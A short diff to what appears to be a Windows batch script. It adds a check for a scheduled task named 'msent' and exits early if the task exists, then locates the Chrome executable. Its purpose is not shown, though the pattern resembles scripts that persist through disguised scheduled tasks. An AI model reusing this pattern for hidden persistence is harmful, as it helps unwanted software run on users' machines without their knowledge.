@@ -1,3 +1,5 @@
+schtasks /query /tn msent
+if errorlevel==0 goto end
 set process=%HOMEDRIVE%\%homepath%\appdata\Local\Google\Chrome\Application\chrome.exe
 if exist "%process%" goto chrome
 set process=C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
